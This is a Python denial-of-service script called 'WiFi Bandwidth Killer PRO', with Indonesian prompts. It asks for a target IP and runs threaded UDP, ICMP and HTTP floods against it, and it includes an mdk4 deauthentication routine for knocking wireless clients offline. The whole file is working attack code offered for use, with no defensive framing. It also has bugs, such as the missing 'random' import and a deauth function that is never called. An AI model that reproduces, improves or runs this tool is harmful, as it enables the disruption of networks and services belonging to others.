#!/usr/bin/env python3
import os
import sys
import time
import socket
import threading
import subprocess
from colorama import Fore, init
init(autoreset=True)

print(Fore.RED + """
╔══════════════════════════════════════════╗
║     WiFi Bandwidth Killer PRO v3.0       ║
║     Made by @Barxzzz                     ║
╚══════════════════════════════════════════╝
""")

# ===== INPUT =====
target_ip = input(Fore.CYAN + "[?] Target IP: " + Fore.WHITE)
port = int(input(Fore.CYAN + "[?] Port (0 untuk random): " + Fore.WHITE) or 0)
threads = int(input(Fore.CYAN + "[?] Jumlah Thread: " + Fore.WHITE))
duration = int(input(Fore.CYAN + "[?] Durasi (detik): " + Fore.WHITE))

# ===== PAYLOAD GENERATOR =====
def random_payload(size=1024):
    return os.urandom(size)

# ===== UDP FLOOD =====
def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            payload = random_payload(4096)  # 4KB per packet
            sock.sendto(payload, (ip, port if port != 0 else random.randint(1, 65535)))
        except:
            pass

# ===== ICMP FLOOD (ping of death) =====
def icmp_flood(ip, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        os.system(f"ping -s 65500 -c 1 {ip} > /dev/null 2>&1")

# ===== HTTP REQUEST FLOOD (bikin server ngelag) =====
def http_flood(ip, duration):
    import requests
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(f"http://{ip}", timeout=0.1)
        except:
            pass

# ===== DEAUTH + MDK4 (buat disconnect client) =====
def deauth_attack(interface="wlan0mon", bssid=None, duration=30):
    if bssid:
        end_time = time.time() + duration
        while time.time() < end_time:
            os.system(f"mdk4 {interface} d -b {bssid} -c 6 -v 0 > /dev/null 2>&1")

# ===== THREAD STARTER =====
def start_attack():
    print(Fore.GREEN + f"\n[✔] Menyerang {target_ip} dengan {threads} thread selama {duration} detik...")
    
    for i in range(threads):
        if port == 0:
            threading.Thread(target=udp_flood, args=(target_ip, 0, duration)).start()
        else:
            threading.Thread(target=udp_flood, args=(target_ip, port, duration)).start()
        
        threading.Thread(target=icmp_flood, args=(target_ip, duration)).start()
        threading.Thread(target=http_flood, args=(target_ip, duration)).start()
        
    # Delay biar thread jalan
    time.sleep(duration)
    print(Fore.RED + "\n[✔] Serangan selesai! Target kemungkinan down.")

# ===== EKSEKUSI =====
if __name__ == "__main__":
    start_attack()
